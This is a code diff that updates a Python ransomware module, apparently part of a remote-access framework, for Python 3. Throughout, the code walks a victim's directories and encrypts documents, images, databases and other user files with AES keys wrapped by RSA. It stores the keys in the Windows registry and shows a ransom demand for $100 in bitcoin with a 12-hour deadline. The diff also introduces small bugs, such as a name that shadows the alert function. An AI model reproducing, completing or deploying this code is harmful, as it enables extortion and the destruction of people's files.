@@ -6,9 +6,13 @@
 import os
 import sys
 import time
-import Queue
 import base64
 import hashlib
+import queue
+if sys.version_info[0] > 2:
+    from queue import Queue
+else:
+    from Queue import Queue
 
 try:
     from StringIO import StringIO  # Python 2
@@ -23,16 +27,16 @@ if sys.platform == 'win32':
     import _winreg
 
 # utilities
-import util
+from util import *
 
 # globals
 packages = ['_winreg','Crypto.PublicKey.RSA','Crypto.Cipher.PKCS1_OAEP']
 platforms = ['win32']
 threads = {}
-tasks = Queue.Queue()
-registry_key = hashlib.md5(util.mac_address()).hexdigest()
+tasks = queue.Queue()
+registry_key = hashlib.sha256(mac_address().encode('utf-8')).hexdigest() # hashlib.md5(mac_address()).hexdigest()
 filetypes = ['.pdf','.zip','.ppt','.doc','.docx','.rtf','.jpg','.jpeg','.png','.img','.gif','.mp3','.mp4','.mpeg',
-	     '.mov','.avi','.wmv','.rtf','.txt','.html','.php','.js','.css','.odt', '.ods', '.odp', '.odm', '.odc',
+             '.mov','.avi','.wmv','.rtf','.txt','.html','.php','.js','.css','.odt', '.ods', '.odp', '.odm', '.odc',
              '.odb', '.doc', '.docx', '.docm', '.wps', '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlk', '.ppt', '.pptx',
              '.pptm', '.mdb', '.accdb', '.pst', '.dwg', '.dxf', '.dxg', '.wpd', '.rtf', '.wb2', '.mdf', '.dbf',
              '.psd', '.pdd', '.pdf', '.eps', '.ai', '.indd', '.cdr', '.jpe', '.jpeg','.tmp','.log','.py',
@@ -65,9 +69,9 @@ def _threader(tasks):
                 else:
                     break
     except Exception as e:
-        util.log("{} error: {}".format(_threader.__name__, str(e)))
+        log("{} error: {}".format(_threader.__name__, str(e)))
 
-@util.threaded
+@threaded
 def _iter_files(rsa_key, base_dir=None):
     try:
         if isinstance(rsa_key, Crypto.PublicKey.RSA.RsaKey):
@@ -75,7 +79,7 @@ def _iter_files(rsa_key, base_dir=None):
                 if os.path.isdir(base_dir):
                     return os.path.walk(base_dir, lambda _, dirname, files: [globals()['tasks'].put_nowait((encrypt_file, (os.path.join(dirname, filename), rsa_key))) for filename in files], None)
                 else:
-                    util.log("Target directory '{}' not found".format(base_dir))
+                    log("Target directory '{}' not found".format(base_dir))
             else:
                 cipher = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
                 reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, globals()['registry_key'], 0, _winreg.KEY_READ)
@@ -90,7 +94,7 @@ def _iter_files(rsa_key, base_dir=None):
                         _winreg.CloseKey(reg_key)
                         break
     except Exception as e:
-        util.log('{} error: {}'.format(_iter_files.__name__, str(e)))
+        log('{} error: {}'.format(_iter_files.__name__, str(e)))
 
 def request_payment(bitcoin_wallet):
     """
@@ -101,12 +105,12 @@ def request_payment(bitcoin_wallet):
 
     """
     try:
-        alert = util.alert("Your personal files have been encrypted. The service fee to decrypt your files is $100 USD worth of bitcoin (try www.coinbase.com or Google 'how to buy bitcoin'). The service fee must be tranferred to the following bitcoin wallet address: %s. The service fee must be paid within 12 hours or your files will remain encrypted permanently. Deadline: %s" % (bitcoin_wallet, time.localtime(time.time() + 60 * 60 * 12)))
+        alert = alert("Your personal files have been encrypted. The service fee to decrypt your files is $100 USD worth of bitcoin (try www.coinbase.com or Google 'how to buy bitcoin'). The service fee must be tranferred to the following bitcoin wallet address: %s. The service fee must be paid within 12 hours or your files will remain encrypted permanently. Deadline: %s" % (bitcoin_wallet, time.localtime(time.time() + 60 * 60 * 12)))
         return "Launched a Windows Message Box with ransom payment information"
     except Exception as e:
         return "{} error: {}".format(request_payment.__name__, str(e))
 
-def encrypt_aes(plaintext, key, padding=chr(0)):
+def encrypt_ransom_aes(plaintext, key, padding=chr(0)):
     """
     AES-256-OCB encryption
 
@@ -120,12 +124,16 @@ def encrypt_aes(plaintext, key, padding=chr(0)):
     Returns encrypted ciphertext as base64-encoded string
 
     """
-    cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB)
-    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
-    output = b''.join((cipher.nonce, tag, ciphertext))
+    try:
+        cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB)
+        ciphertext, tag = cipher.encrypt_and_digest(plaintext)
+        output = b''.join((cipher.nonce, tag, ciphertext))
+    except Exception as e:
+        log("{} error: {}".format(decrypt_files.__name__, str(e)))
+        return ''
     return base64.b64encode(output)
 
-def decrypt_aes(ciphertext, key, padding=chr(0)):
+def decrypt_ransom_aes(ciphertext, key, padding=chr(0)):
     """
     AES-256-OCB decryption
 
@@ -167,17 +175,17 @@ def encrypt_file(filename, rsa_key):
                     aes_key = os.urandom(32)
                     with open(filename, 'rb') as fp:
                         data = fp.read()
-                    ciphertext = encrypt_aes(data, aes_key)
+                    ciphertext = encrypt_ransom_aes(data, aes_key)
                     with open(filename, 'wb') as fd:
                         fd.write(ciphertext)
                     key = base64.b64encode(cipher.encrypt(aes_key))
-                    util.registry_key(globals()['registry_key'], filename, key)
-                    util.log('{} encrypted'.format(filename))
+                    registry_key(globals()['registry_key'], filename, key)
+                    log('{} encrypted'.format(filename))
                     return True
         else:
-            util.log("File '{}' not found".format(filename))
+            log("File '{}' not found".format(filename))
     except Exception as e:
-        util.log("{} error: {}".format(encrypt_file.__name__, str(e)))
+        log("{} error: {}".format(encrypt_file.__name__, str(e)))
     return False
 
 def decrypt_file(filename, key):
@@ -195,15 +203,15 @@ def decrypt_file(filename, key):
         if os.path.isfile(filename):
             with open(filename, 'rb') as fp:
                 ciphertext = fp.read()
-            plaintext = decrypt_aes(ciphertext, key)
+            plaintext = decrypt_ransom_aes(ciphertext, key)
             with open(filename, 'wb') as fd:
                 fd.write(plaintext)
-            util.log('{} decrypted'.format(filename))
+            log('{} decrypted'.format(filename))
             return True
         else:
-            util.log("File '{}' not found".format(filename))
+            log("File '{}' not found".format(filename))
     except Exception as e:
-        util.log("{} error: {}".format(decrypt_file.__name__, str(e)))
+        log("{} error: {}".format(decrypt_file.__name__, str(e)))
     return False
 
 def encrypt_files(args):
@@ -230,7 +238,7 @@ def encrypt_files(args):
         else:
             return "File '{}' does not exist".format(target)
     except Exception as e:
-        util.log("{} error: {}".format(encrypt_files.__name__, str(e)))
+        log("{} error: {}".format(encrypt_files.__name__, str(e)))
 
 def decrypt_files(rsa_key):
     """
@@ -249,7 +257,7 @@ def decrypt_files(rsa_key):
         globals()['threads']['decrypt_files'] = _threader()
         return "Decrypting files"
     except Exception as e:
-        util.log("{} error: {}".format(decrypt_files.__name__, str(e)))
+        log("{} error: {}".format(decrypt_files.__name__, str(e)))
 
 def run(args=None):
     """
@@ -270,3 +278,4 @@ def run(args=None):
             reg_key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, globals()['registry_key'])
             return encrypt_files(action)
     return usage
+
